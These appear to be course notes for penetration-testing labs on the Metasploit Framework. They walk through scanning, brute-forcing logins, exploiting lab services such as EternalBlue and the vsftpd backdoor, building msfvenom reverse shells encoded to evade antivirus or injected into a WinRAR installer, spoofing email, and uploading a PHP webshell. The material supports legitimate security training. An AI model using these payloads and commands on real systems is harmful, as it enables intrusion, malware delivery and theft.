# Host & Network Penetration Testing - The Metasploit Framework (MSF)

<br>

## 1. Metasploit Framework Overview

### 1.1. Metasploit Framework Architecture

```shell
cd /usr/share/metasploit-framework/modules
cd /home/kali/.msf4/modules # Here I can add my own modules
```

### 1.2. MSFconsole Fundamentals

```shell
service postgresql start && msfconsole
msfconsole -q
msfconsole

# Clear the terminal using CTRL + L

# We can also confirm that the database is connected to the Metasploit framework console by using the following command
db_status

help # Check the core commands
version
show all
show exploits
show -h
```

Let's say we want to perform some port scanning

```shell
search portscan
use <module_name> or <module_number>
show options
run

# Stop using a module
back
```

```shell
search -h
search cve:2017 type:exploit platform:windows
```

Advanced commands when it comes down to specific modules.

```shell
sessions
connect -h
# Communicate with a host, similar to interacting via netcat, taking advantage of any configured session pivoting.
```

### 1.3. Creating & Managing  Work - Spaces

For every engagement I would recommend that you create a new workspace so that data is separated from your previous engagement or assessment. That's very very important. You never want to mix data from one company with another.

The older data pertinent on the Metasploit framework and the MSF console is going to be store within the Metasploit framework database. So in order to create work-spaces and have that data persistent across restarts you need to make sure that the Metasploit framework console is connected to the Metasploit framework database.

```shell
# Check database status
db_status
workspace -h
workspace # Displays workspaces
hosts

workspace -a Test # Create a new workspace called Test
workspace <name_workspace> # To change workspace
workspace -d Test # Delete workspace
```

<br>

## 2. Information Gathering & Enumeration

### 2.1. Importing Nmap Scan Results Into MSF

This Nmap command scans the target IP, bypassing host discovery (`-Pn`), detects running services and versions (`-sV`), identifies the operating system (`-O`), and saves the output in XML format (`-oX` <file_name).

```shell
nmap -Pn  -sV -O <target_IP> -oX <file_name>

service postgresql start && msfconsole
db_status
# Before importing the results from Nmap we need to create a new workspace
workspace -a <workspace_name>
workspace
db_import <file_location>

hosts
services

workspace -a Nmap_MSF
db_nmap -Pn -sV -O <target_IP>
```

### 2.2. Port Scanning with Auxiliary Modules - T1046

There are two target machines, one of them is vulnerable and can be exploited using the following information:
- **Vulnerability**: XODA File Upload Vulnerability
- **Metasploit module**: exploit/unix/webapp/xoda_file_upload

```shell
nmap --script http-enum -p 80 <target_IP>

service postgresql start && msfconsole
db_status
workspace -a xoda

search xoda
use exploit/unix/webapp/xoda_file_upload
set RHOSTS <target_IP>
set TARGETURI /
exploit
# Now we just going to wait for this to bering up a meterpreter session

# Start a command shell and identify the IP address range of the second target machine.
shell
ip addr
# We see eth1 that has a totally different IP subnet. Just add 1 to that IP address. 
# crtl+C to terminat the session. We can add the rout within the meterpreter. 
run autoroute -s <second_target_IP>

background

use auxiliary/scanner/portscan/tcp
set RHOSTS <second_target>
set verbose false
set ports 1-1000
exploit

# Check the static binaries available in the "/usr/bin/" directory.
ls -al /root/static-binaries/nmap
file /root/static-binaries/nmap

# use VIM - bash-port-scanner.sh
#!/bin/bash
for port in {1..1000}; do
timeout 1 bash -c "echo >/dev/tcp/$1/$port" 2>/dev/null && echo "port $port is open"
done

# Upload the nmap static binary and the bash port scanner script to the target machine.
upload /root/static-binaries/nmap /tmp/nmap
upload /root/bash-port-scanner.sh /tmp/bash-port-scanner.sh

# Make the binary and script executable and use the bash script to scan the second target machine.
shell
cd /tmp/
chmod +x ./nmap ./bash-port-scanner.sh
./bash-port-scanner.sh <second_target_IP>

# Using the nmap binary, scan the target machine for open ports.
./nmap -p- <second_target_IP>
```

### 2.3. FTP Enumeration

**Objective**: Your task is to perform FTP enumeration with Metasploit.

```shell
service postgresql start && msfconsole
workspace -a FTP_Enum

# Metasploit modules 
use auxiliary/scanner/ftp/anonymous
use auxiliary/scanner/ftp/ftp_version
use auxiliary/scanner/ftp/ftp_login
# set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
# set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
# Sometimes brute force cause a service to be overwhelmend. Or you can actually initiate a DDos that will take down the service.

# The command ftp <target_IP> initiates an FTP connection to the specified target IP, allowing file transfer operations.
ftp <target_IP> # uase USR and PSW
ls
get secret.txt
```

### 2.4. Web Server Enumeration

Apache enumeration is a crucial step in the reconnaissance phase of a penetration test, where the goal is to gather as much information as possible about the Apache web server being targeted. This information can help in identifying potential vulnerabilities or misconfigurations that can be exploited later in the test.

**Objective:** Run the following auxiliary modules against the target (victim-1).

```shell
msfconsole -q
setg RHOSTS <target_IP>
```

- auxiliary/scanner/http/http_version
- auxiliary/scanner/http/robots_txt

```shell
# Disallow: /data
# Disallow: /secure
```

- auxiliary/scanner/http/http_header

```shell
use auxiliary/scanner/http/http_header
set RHOSTS <target_IP>
set TARGETURI /secure
run
```

- auxiliary/scanner/http/brute_dirs

```shell
use auxiliary/scanner/http/brute_dirs
set RHOSTS <target_IP>
run
# [+] Found http://victim-1:80/doc/ 200
# [+] Found http://victim-1:80/pro/ 200
```

- auxiliary/scanner/http/dir_scanner

```shell
use auxiliary/scanner/http/dir_scanner
set RHOSTS <target_IP>
set DICTIONARY /usr/share/metasploit-framework/data/wordlists/directory.txt
run
```

- auxiliary/scanner/http/dir_listing

```shell
use auxiliary/scanner/http/dir_listing
set RHOSTS <target_IP>
set PATH /data
run
```

- auxiliary/scanner/http/files_dir

```shell
use auxiliary/scanner/http/files_dir
set RHOSTS <target_IP>
set VERBOSE false
run
```

- auxiliary/scanner/http/http_put

```shell
use auxiliary/scanner/http/http_put
set RHOSTS <target_IP>
set PATH /data
set FILENAME test.txt
set FILEDATA "Welcome To AttackDefense"
run
```

We can observe that we have successfully written a file on the target server. If the file already exists it will overwrite it. Let’s use `wget` and download the `test.txt` file and verify it.

```shell
wget http://<target_IP>:80/data/test.txt 
cat test.txt
```

We can download the `text.txt` file and we can see it’s content i.e "Welcome To AttackDefense"
Now, let’s use DELETE method and delete the text.file

```shell
use auxiliary/scanner/http/http_put
set RHOSTS <target_IP>
set PATH /data
set FILENAME test.txt
set ACTION DELETE
run
```

- auxiliary/scanner/http/http_login

```shell
use auxiliary/scanner/http/http_login
set RHOSTS <target_IP>
set AUTH_URI /secure/
set VERBOSE false
run
```

- auxiliary/scanner/http/apache_userdir_enum

```shell
use auxiliary/scanner/http/apache_userdir_enum
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set RHOSTS <target_IP>
set VERBOSE false
run
```

### 2.5. MySQL Enumeration

MySQL is an open-source relational database management system (RDBMS). It is one of the most widely used database systems in the world and is commonly used in web applications and is a central component of the LAMP stack (Linux, Apache, MySQL, PHP/Python/Perl). The default port for MySQL server is 3306. This port is used for client-server communication in MySQL database management systems.

**Objective**: Your task is to run the following auxiliary modules against the target.

```shell
workspace -a MySQL_ENUM
search portscan tcp
use auxiliary/scanner/portscan/tcp
setg RHOSTS <target_IP>
show options
run
# Port 3306 is open
```

Using of modules:

```shell
use auxiliary/scanner/mysql/mysql_version
show options
run

use auxiliary/scanner/mysql/mysql_login
show options
# We know that the 'root' user has the highest privileges
set USERNAME root
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set VERBOSE false
run
# Credential found: Success: 'root:twinkle'

use auxiliary/admin/mysql/mysql_enum
info
set PASSWORD twinkle
set USERNAME root
run

# The next module is arguably one of the most important when it comes to MySQL enumeration using the Metasploit framework.
search mysql_sql
# As we can see, this module falls under the admin subdirectory within the auxiliary module, which means we need credentials to run it.
use auxiliary/admin/mysql/mysql_sql
# This module allows us to execute SQL queries. 
info
set PASSWORD twinkle
set USERNAME root
run

set SQL show databases;
run
set SQL use videos;
run

use auxiliary/scanner/mysql/mysql_file_enum
set USERNAME root
set PASSWORD twinkle
set RHOSTS <target_IP>
set FILE_LIST /usr/share/metasploit-framework/data/wordlists/directory.txt
set VERBOSE true
run

use auxiliary/scanner/mysql/mysql_hashdump
run

auxiliary/scanner/mysql/mysql_schemadump
run

use auxiliary/scanner/mysql/mysql_writable_dirs
set DIR_LIST /usr/share/metasploit-framework/data/wordlists/directory.txt
run

exit # Exit from Metasploit framework.

mysql -h <target_IP> -u root -p
# Press enter and write the password
# Now we have access to the database
show databases;
show tables;
exit
```

### 2.6. SSH Enumeration

```shell
# Start PostgreSQL and Metasploit
service postgresql start
msfconsole

# Create workspace and set target IP
workspace -a SSH_ENUM
setg RHOSTS <target_IP>
setg RHOST <target_IP>

# Enumerate SSH version
use auxiliary/scanner/ssh/ssh_version
run

# Brute-force SSH login
use auxiliary/scanner/ssh/ssh_login
set USERS_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/common_passwords.txt
set VERBOSE false
run

# Check sessions and interact
sessions
sessions 1
ls
/bin/bash -i
ls
whoami
exit

# Enumerate SSH users
use auxiliary/scanner/ssh/ssh_enumusers
set USERS_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
run
```

### 2.7. SMTP Enumeration

```shell
# Start PostgreSQL (required for Metasploit database functionality) and launch Metasploit
service postgresql start
msfconsole

# Create a dedicated workspace for SMTP enumeration to keep results organized
workspace -a SMTP_ENUM

# Set the target IP globally for all modules to avoid re-entering it
setg RHOSTS <target_IP>

# Enumerate the SMTP service version to identify the mail server software
use auxiliary/scanner/smtp/smtp_version
run

# Perform SMTP user enumeration to identify valid email accounts on the target
use auxiliary/scanner/smtp/smtp_enum
info  # Display module details, including required options
run
```

### 2.8. Postfix Recon: Basics

```shell
# Step 1: What is the SMTP server name and banner.
nmap -sV -script banner <target_IP>
# Banner: openmailbox.xyz ESMTP Postfix: Welcome to our mail server.

# Step 2: Connect to SMTP service using netcat and retrieve the hostname of the server (domain name).
nc <target_IP> 25

# Step 3: Does user "admin" exist on the server machine? Connect to SMTP service using netcat and check manually.
VRFY admin@openmailbox.xyz

# Step 4: Does user "commander" exist on the server machine? Connect to SMTP service using netcat and check manually.
VRFY commander@openmailbox.xyz

# Step 5: What commands can be used to check the supported commands/capabilities? Connect to SMTP service using telnet and check.
telnet <target_IP> 25
HELO attacker.xyz
EHLO attacker.xyz

# Step 6: How many of the common usernames present in the dictionary /usr/share/commix/src/txt/usernames.txt exist on the server. Use smtp-user-enum tool for this task.
smtp-user-enum -U /usr/share/commix/src/txt/usernames.txt -t <target_IP>

# Step 7: How many common usernames present in the dictionary /usr/share/metasploit-framework/data/wordlists/unix_users.txt exist on the server. Use suitable metasploit module for this task.
msfconsole -q
use auxiliary/scanner/smtp/smtp_enum
set RHOSTS <target_IP>
exploit

# Step 8: Connect to SMTP service using telnet and send a fake mail to root user.
telnet <target_IP> 25
HELO attacker.xyz
mail from: admin@attacker.xyz
rcpt to:root@openmailbox.xyz
data
Subject: Hi Root
Hello,
This is a fake mail sent using telnet command.
From,
Admin
.
# Note: There is a dot(.) in the last line which indicates the termination of data.

# Step 9: Send a fake mail to root user using sendemail command.
sendemail -f admin@attacker.xyz -t root@openmailbox.xyz -s <target_IP> -u Fakemail -m "Hi root, a fake from admin" -o tls=no
```

<br>

## 3. Vulnerability Scanning

### 3.1. Vulnerability Scanning with MSF

```shell
sudo nmap -sn 10.10.10.1/24
seervice postgresql start && msfconsole
db_status
setg RHOSTS <target_IP>
setg RHOST <target_IP>
```

Vulnerability scanning relies on identifying the target's OS and running services, with SERVICE VERSION being crucial.

```shell
workspace -a MS3
db_nmap -sS -sV -O <target_IP>
hosts
services
```

To identify vulnerabilities, use the exact service version (e.g., Microsoft IIS) and manually search for known exploits.

```shell
search type:auxiliary name:Microsoft IIS
# As we can see ther are all other versions of IIS like, 5.0, 4.0 etc.
```

There are two scenarios here:
- This particular version of Microsoft IIS might not be vulnerable to an inherent exploit
- There isn't a metasploit module available that can be used to exploit this particular service

```shell
search type:auxiliary name:MySQL 5.5
# Nothing related to this particular version
```

Another case:

```shell
search Sun GlassFish
use exploit/multi/http/glassfish_deployer
# We can see a payload has been set. The payload is what is sent to the target system.
info
set payload windows/meterpreter/reverse_tcp
show options
```

**Searchsploit** lists exploits, including those outside Metasploit, while also displaying available Metasploit modules.

```shell
searchsploit "Microsoft Windows SMB"
# In brackets we can see if there is a metasploit module for that exploit
searchsploit "Microsoft Windows SMB" | grep -e "Metasploit"
# However, we still don't know wheter any of these Metasploit modules will work on the version or the operating system.

search eternalblue
use auxiliary/scanner/smb/smb_ms17_010
show options
run
 
use auxiliary/scanner/smb/smb_ms17_010_eternalblue
show options
run
sysinfo 
```

So that's how to gain identify or perform some manual vulnerability scanning with the Metasploit framework.

**AutoPwn**
The next technique is the process or the DB auto pawn plugin. This is very important because it's extremely useful plugin for the Metasploit framework. 

```shell
# Metasploit Autopwn
cd Downloads/
wget https://raw.githubusercontent.com/hahwul/metasploit-autopwn/master/db_autopwn.rb
sudo mv db_autopwn.rb /usr/share/metasploit-framework/plugins/

# msfconsole
load db_autopwn
db_autopwn

# Enumerates exploits for each of the open ports
db_autopwn -p -t
# Limit to only the 445 port
db_autopwn -p -t -PI 445
db_autopwn -p -t -PI 21
```

We can make use of the **analyze command**. This command will essentially analyse the contents of the metasploit framework database, so the hosts and services and then will provide with a list of vulnerabilities that those particular services suffer from or that can be exploited. 

```shell
# msfconsole
analyze
vulns
```

This is how to perform vulnerability scanning with Metasploit framework and how to utilize the various auxiliary and exploit module to test whether a particular service is vulnerable to an exploit or not. We've also explored the process of utilizing search exploit in order to identify or find vulnerabilities for specific services. 

Last example:

```shell
# msfconsole
services
# Now I maybe want to target this particular version of Apache Tomcat - Apache Tomcat/Coyote JSP engine 1.1
searchsploit "Apache Tomcat/Coyote JSP engine 1.1"
# In this case we don't get anyting
searchsploit "Apache Tomcat"
```

<br>

## 4. Client-Side Attacks

### 4.1. Generating Payloads With Msfvenom

Now we've essentially explored the process of performing:
- Information gathering
- Enumeration
- Vulnerability scanning

Now, we can move on to exploring **exploitation**, starting with **client-side attacks** as our initial attack vector. To perform these attacks, we must first learn how to generate payloads within the Metasploit framework. For this purpose, we'll use a utility called **MSFvenom**.

```shell
msfvenom --list payloads # List of available payloads
msfvenom --list formats
msfvenom --list encoders

# Win 32bit
msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=<LOCAL_HOST_IP> LPORT=<LOCAL_PORT> -f exe > <PAYLOAD_FILE_x86>.exe

# Win 64bit
msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=<LOCAL_HOST_IP> LPORT=<LOCAL_PORT> -f exe > <PAYLOAD_FILE_x64>.exe

# Linux 32bit
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<LOCAL_HOST_IP> LPORT=<LOCAL_PORT> -f elf > <PAYLOAD_FILE_x86>

# Linux 64bit
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<LOCAL_HOST_IP> LPORT=<LOCAL_PORT> -f elf > <PAYLOAD_FILE_x64>

# Win 32bit + shikata_ga_nai encoded
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LOCAL_HOST_IP> LPORT=<LOCAL_PORT> -e x86/shikata_ga_nai -f exe > <PAYLOAD_ENCODED_x86>.exe

# Use more encoding iterations
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LOCAL_HOST_IP> LPORT=<LOCAL_PORT> -i 10 -e x86/shikata_ga_nai -f exe > <PAYLOAD_ENCODED_x86>.exe

# Linux 32bit + shikata_ga_nai encoded
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<LOCAL_HOST_IP> LPORT=<LOCAL_PORT> -i 10 -e x86/shikata_ga_nai -f elf > <PAYLOAD_ENCODED_x86>

# Inject into Portable Executables
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LOCAL_HOST_IP> LPORT=<LOCAL_PORT> -e x86/shikata_ga_nai -i 10 -f exe -x winrar-x32-621.exe > winrar.exe

# JSP Java Meterpreter Reverse TCP
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.jsp #TomCat content management system 

# PHP
msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php\  #PHP Web Application
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
```

We can now transfer this over to the target system, or you can essentially set this up in a social engineering campaign.
Before they execute it you need to set up a handler.

In terms of transferring the payloads on the target, this depend on the type of social engineering technique that you will utilize. For example we are going to set up a simple web server within this folder to serve two payload files. 

```shell
sudo python -m SimpleHTTPServer 80
# No we also need to set the handler to receive the connection back from the target system.
# MSF STAGED Payload
windows/x64/meterpreter/reverse_tcp

# MSF NON-STAGED Payload
windows/x64/meterpreter_reverse_https

# Upload the payload on the target and try it with MSFconsole
cd Payloads
sudo python -m http.server 8080
msfconsole -q

use multi/handler
set payload <MSFVENOM_PAYLOAD>
set LHOST <MSFVENOM_LOCAL_HOST_IP>
set LPORT <MSFVENOM_LOCAL_PORT>
run
```

### 4.2. Encoding Payloads with Msfvenom

We are going to be taking a look at how to encode both Linux and Windows payloads with the objective of **avoiding signature based antivirus solution**. The **encoding** is essentially the process of modifying the payload shellcode with the objective of modifying the payloads signature. So if I modify a file, the signature change almost immediately. However this has limitations. 

```shell
msfvenom --list encoders

msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LOCAL_HOST_IP> LPORT=<LOCAL_PORT> -e x86/shikata_ga_nai -f exe > ~/Desktop/Windows_Payloads/encodedx86.exe
cd Windows_Payloads/
ls
```

Increasing encoder iterations (e.g., `shikata_ga_na`) enhances payload obfuscation, improving antivirus evasion.

```shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LOCAL_HOST_IP> LPORT=<LOCAL_PORT> -i 10 -e x86/shikata_ga_nai -f exe > ~/Desktop/Windows_Payloads/encodedx86.exe
# -i 10 is number or iterations
# --iterations 10
```

For Linux:

```shell
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<LOCAL_HOST_IP> LPORT=<LOCAL_PORT> -i 10 -e x86/shikata_ga_nai -f elf > <PAYLOAD_ENCODED_x86>
sudo python -m SimpleHTTPServer 80
msfconsole
use multi/handler
set payload windows/meterpreter/reverse_tcp # example
set payload <MSFVENOM_PAYLOAD>
set LHOST <MSFVENOM_LOCAL_HOST_IP>
set LPORT <MSFVENOM_LOCAL_PORT>
run

# Back to the windows system, open the browser with the my ip address and save the .exe file and execute it. Back to the kali VM. 
 sysinfo
 whoami 
```

### 4.3. Injecting Payloads Into Windows Portable Executables

Generating the payload and inject it in WinRAR.

```shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LOCAL_HOST_IP> LPORT=<LOCAL_PORT> -e x86/shikata_ga_nai -i 10 -f exe -x ~Downloads/wrar602.exe > ~/Desktop/Windows_Payloads/winrar.exe
sudo python -m SimpleHTTPServer 80
msfconsole
use multi/handler
set payload windows/meterpreter/reverse_tcp # example
set payload <MSFVENOM_PAYLOAD>
set LHOST <MSFVENOM_LOCAL_HOST_IP>
set LPORT <MSFVENOM_LOCAL_PORT>
run

# Switch to the windows system. We can now see that the downloaded file looks like the winrar file, however because we did not specify the k option to maintain the functionality of the executable, what wil happen is when we double click on it it'll actaully not provide us with the winrar installer, it'll just exectute the actual payload. 
# Back to the Kali and 
systeminfo
run post/windows/manage/migrate
```

### 4.4. Automating Metasploit With Resource Scripts

 We noticed that there are a few commands that can be quite repetitive, for example, lie setting up a multi-handler for the payloads and that's where resource scripts come into play.

```shell
# We have a series of a collection of resource scripts that can come pre-packaged with Kali. I can view them by listing out the contents of the directory user share Metasploit framework.
ls -lah /usr/share/metasploit-framework/scripts/resource
vim /usr/share/metasploit-framework/scripts/resource/auto_brute.rc

cd Windows_Payloads/
ls

# So if I want to set up a handler resource script to essencially set up a multi handler for the Windows payloads, I would create one.
vim handler.rc # nano handler.rc
# Whitin the document I can then specify the command or that I would tipically run when setting up a handler. 

# Insert the following lines
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <LOCAL_HOST_IP>
set LPORT <LOCAL_PORT>
run
# Save it and exit

# In order to load it an actually see how this work, we need to type:
msfconsole -q -r handler.rc

# msfconsole
resource handler.rc

# Export inserted msfconsole commands into a resource script
# Exprort commands typed in msfconsole
makerc <File_destination_FILE_name>.rc

# Another example
vim db_status
# Insert the following lines
db_status
workspace
workspace -a Test

msfconsole -r db_status.rc
```

<br>

## 5. Exploitation - Windows

### 5.1. Exploiting A Vulnerable HTTP File Server

An HTTP File Server (HFS) is a server application that facilitates file sharing over the HTTP protocol. It allows users to upload, download, and manage files via a web interface. HFS can be used for both personal and professional purposes to share files easily over a network.

**Objective:** Exploit the application and retrieve the flag!

```shell
# Start PostgreSQL (required for Metasploit's database functionality) and launch Metasploit
service postgresql start
msfconsole

# Check if the database is connected
db_status

# Create and switch to a dedicated workspace for HFS exploitation
workspace -a HFS
workspace

# Set the target IP globally for all modules
setg RHOSTS <target-ip>

# Perform an aggressive Nmap scan to detect open ports, services, and OS details
db_nmap -sS -sV -O <target-ip>

# Identify that an HTTP File Server (HFS) is running on port 80

# Search for an exploit related to Rejetto HFS
search type:exploit name:rejetto
use exploit/windows/http/rejetto_hfs_exec
show options
info  # Display module details
# The payload we will use is 'windows/meterpreter/reverse_tcp' since it's not specified by default
run

# Verify session access
sysinfo
```

### 5.2. Exploiting Windows MS17- 010 SMB Vulnerability 

```shell
# Start Metasploit
msfconsole

# Create and switch to a dedicated workspace for EternalBlue exploitation
workspace -a EternalBlue

# Perform an Nmap scan to detect open ports, services, and OS details
db_nmap -sS -sV -O <target_IP>

# Identify SMB running on port 445
services

# Search for auxiliary modules related to EternalBlue
search type:auxiliary EternalBlue

# Use the SMB vulnerability scanner to check if the target is vulnerable to MS17-010
use auxiliary/scanner/smb/smb_ms17_010
show options
set RHOSTS <target_IP>
run

# Analyze the output to confirm vulnerability

# Search for the actual exploit module for EternalBlue
search type:exploit EternalBlue
use exploit/windows/smb/ms17_010_eternalblue
show options
set RHOST <target-ip>

# Execute the exploit and establish a session
run

# Verify system access
sysinfo
getuid
# Full system compromise confirmed – no need for privilege escalation as we already have SYSTEM-level access.
```

### 5.3. Exploiting A Vulnerable Apache Tomcat Web Server

Apache Tomcat is a Java web server that primarily serves as a servlet container, which means it provides an environment for running Java-based web applications. In this lab, we will identify a vulnerability in the Tomcat server and exploit it using a suitable Metasploit module.

Your task is to fingerprint the application using the tools available on the Kali machine and then exploit the application using the appropriate Metasploit module.

**Objective**: Exploit the application and retrieve the flag!

```shell
nmap --top-ports 65536 <target_IP>
# We have discovered that multiple ports are open. Access port 8080 using firefox browser.
firefox demo.ine.local:8080
# Target is running a Tomcat Server 8.5.19. Search “apache tomcat 8.5.19 exploit” on google to find the vulnerability.
nmap -sV -p 8080 <target_IP>

# Search for Tomcat JSP exploit modules
search type:exploit tomcat_jsp
use exploit/multi/http/tomcat_jsp_upload_bypass
set RHOSTS <target_IP>
check 
# We are running a “check” command in the metasploit framework to make sure the target is vulnerable.
exploit

# Searching the flag.
cd /
dir
cat flag.txt
```

<br>

## 6. Exploitation - Linux

### 6.1. Exploiting A Vulnerable FTP Server

VSFTPD (Very Secure FTP Daemon) is a FTP server software for Unix-like systems designed to be fast and lightweight while providing essential features for file transfer operations. 

**Objective**: Exploit the server using suitable Metasploit module and get a shell on the target.

```shell
service postgresql start && msfconsole
workspace -a VSF_Scan
db_nmap -sS -sV -O <target_IP>
services

search vsf
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST <target_IP>
exploit

whoami
/bin/bash -i 
# Put it in the background ctrl+z

search shell_to_meterpreter
use post/multi/manage/shell_to_meterpreter
show options
set LHOST <kali_IP>
set SESSION 1
run
sessions 2
sysinfo
```

### 6.2. Exploiting Samba (File Sharing Service)

**Samba** is a free software re-implementation of the SMB (Server Message Block) networking protocol, and it provides file and print services for various Microsoft Windows clients and can integrate with a Windows Server domain, either as a Primary Domain Controller (PDC) or as a domain member. In this lab, we will see how a vulnerable file-sharing service can be exploited.

**Objective:** Get a shell on the target by exploiting a file-sharing service.

```shell
db_nmap -sS -sV -O <target_IP>
services
# We have discovered a Samba server running on the target machine. Let’s use metasploit module and exploit the target.

msfconsole -q
use exploit/linux/samba/is_known_pipename
set RHOST <target_IP>
check
exploit
```

### 6.3. Exploiting A Vulnerable SSH Server

SSH (Secure Shell) is a network protocol that allows secure access to remote systems over an unsecured network. It provides encrypted communication between a client and a server, typically used for remote administration, file transfers, and tunneling.

**Objective:** Get a shell on the target by exploiting the vulnerable server using a suitable Metasploit module.

```shell
service postgresql  start && msfconsole
db_nmap -sV -O <target_IP>
services

search libssh
use auxiliary/scanner/ssh/libssh_auth_bypass
show info
set RHOSTS <target_IP>
set SPAWN_PTY true
# SPAWN_PTY is an option within Metasploit’s libssh module that determines whether to spawn a pseudo-terminal (PTY) upon successful exploitation.
run
sessions -i 1

whoami
cat /etc/*release
uname -r
```

### 6.4. Exploiting A Vulnerable SMTP Server

**Objective:** Your task is to fingerprint the application using command line tools available in Kali and then exploit the application using the appropriate Metasploit module. Get a shell on the target!

```shell
ping -c 1 <target_IP>
nmap -sV -O <target_IP>
# TCP port 25 is open and running Haraka SMTPD (version 2.8.8), which is an SMTP (Simple Mail Transfer Protocol) server. Haraka is an open-source SMTP server designed for high performance and scalability.

service postgresql start && msfconsole
workspace -a Haraka
search haraka

# Load the Haraka SMTP Exploit module in Metasploit
use exploit/linux/smtp/haraka  
# Set the remote host (target SMTP server) that we want to exploit
set RHOST <target_IP> 
# Set the local server port for handling incoming connections (Default is 9898)
# This is necessary for receiving the reverse connection from the exploited target.
set SRVPORT 9898  
# Specify the target email address to send the malicious payload
# In this case, "root@attackdefense.test" is the intended recipient on the target SMTP server.
set email_to root@attackdefense.test  
# Select the payload to be used in the exploit
# We are using a Meterpreter reverse HTTP shell for a stable connection.
set payload linux/x64/meterpreter_reverse_http  
# Define the local host (our attack machine) that will receive the reverse shell connection
set LHOST <kali_IP>
# Execute the exploit and attempt to gain access to the target system
exploit  

# Ignore any error you see, as you have already gained the meterpreter session. To list active sessions, run the following command:
sessions
sessions -i 1

sysinfo
getuid
# We have root access since uid=0
```

<br>

## 7. Post Exploitation Fundamentals

### 7.1. Meterpreter Fundamentals (Basic)

Meterpreter, short for "Meta-Interpreter," is an advanced, dynamically extensible payload used within the Metasploit Framework, a popular penetration testing tool. Meterpreter provides an interactive shell that allows attackers to execute commands and scripts on a compromised system.

**Objective:** Perform the following tasks to complete the lab.

```shell
nmap -sV <target_IP>
dirb <target_IP> # add http or https
```

The command `dirb http://<target_IP>` runs **DIRB**, a tool used for **directory brute-forcing** on web servers. It attempts to discover **hidden directories and files** by making HTTP requests to the target using a predefined wordlist. This is useful for **penetration testing** as it helps identify **login pages, admin panels, backup files, and other sensitive resources** that may not be publicly linked. If a directory exists, DIRB returns its HTTP response code, such as `200` for accessible pages or `403` for restricted ones. This information can be used to further investigate potential security weaknesses in the web application.

```shell
curl <target_IP>

service postgresql start && msfconsole
search xoda
use exploit/unix/webapp/xoda_file_upload
set RHOSTS <target_IP>
set TARGETURI /
set LHOST <local _Kali_IP>
run
```

**Questions:**

```shell
# 1. Check the present working directory on remote (exploited) machine.
pwd

# 2. List the files present in present working directory of the remote machine.
ls

# 3. Check the present working directory on local (attacker) machine.
lpwd

# 4. List the files present in present working directory of the local machine.
lls

# 5. Get the flag value present in /app/flag1 file.
cat /app/flag1

# 6. Change the flag value present in /app/flag1, so that no one else can get the right flag.
edit /app/flag1 # Type Vlad for example then write and quit > :wq
cat /app/flag1

# 7. Change the present working directory to a suspiciously named directory in /app and read the flag from a hidden file present in that directory.
cd "Secret Files"
ls
cat .flag2

# 8. Get the flag5.zip to local machine, open it using password 56784. The information given in the extracted file will give clue about the location of the another flag.
ls
unzip flag5.zip
cat list

# 9. Delete the .zip file from the directory.
rm flag5.zip

# 10. Print checksum of file mentioned in the extracted file (Refer to Q8).
checksum md5 /bin/bash

# 11. Check the PATH environment variable on the remote machine.
getenv PATH

# 12. There is a file with string “ckdo” in its name in one of the places included in PATH variable. Print the flag hidden in that file.
search -d /usr/bin -f *ckdo*

# 13. Change to tools directory on the local machine.
lcd /root/Desktop/tools

# 14. Upload a PHP webshell to app directory of the remote machine.
upload /usr/share/webshells/php/php-backdoor.php
```

### 7.2. Upgrading Command Shells to Meterpreter

Upgrading a command shell to a Meterpreter shell in Metasploit is a powerful technique during penetration testing, as Meterpreter provides advanced features that are not available in a standard command shell. Meterpreter is a sophisticated payload that provides an interactive shell and allows for extensive post-exploitation activities, such as file system browsing, process manipulation, and network pivoting. 

**Objective**: Exploit the vulnerable service using suitable Metasploit module and then upgrade the command shell session to a meterpreter session.

```shell
service prosgresql start && msfconsole
workspace -a upgrading_shell
db_nmap -sV <target_IP>

search type:exploit samba
use exploit/linux/samba/is_known_pipename
show options
set RHOSTS <target_IP>
run

# Now we got a typical Linux command shell.
ls
pwd
/bin/bash -i 
background # or CTRL + Z
sessions

# Now we can upgrade this command shell session to a Meterpreter shell by using a post-exploitation module.
search shell_to_meterpreter
use post/multi/manage/shell_to_meterpreter
show options
set SESSION 1
set LHOST <local_kali_IP>
run

# We can now interact with the target system with a meterpreter shell
sessions
```

<br>

## 8. Windows Post Exploitation

### 8.1. Windows Post Exploitation Modules

This lab covers the process of automating various phases of post-exploitation through the use of various Metasploit modules.

**Objective:** Your task is to run various Windows Post Exploitation Metasploit modules against the compromised target.

```shell
# Run an nmap scan against the target
nmap -sV <target_IP>

# The target system has a vulnerable version of the Rejetto HTTP File Server running on port 80 that can be exploited through the use of a Metasploit module.
service postgresql start && msfconsole
search rejetto
use exploit/windows/http/rejetto_hfs_exec
set RHOSTS demo.ine.local
run

# The successful execution of the module will provide us with a meterpreter session. We have now gained access to the Windows system and can begin the process of automating post exploitation with Metasploit.
```

Given that have obtained a meterpreter session on the target system, we can leverage various post-exploitation modules to automate the enumeration of important information.

```shell
background

# 1) The first module we can explore is the win_privs module, which can be used to automate the enumeration of the current user privileges. 
use post/windows/gather/win_privs

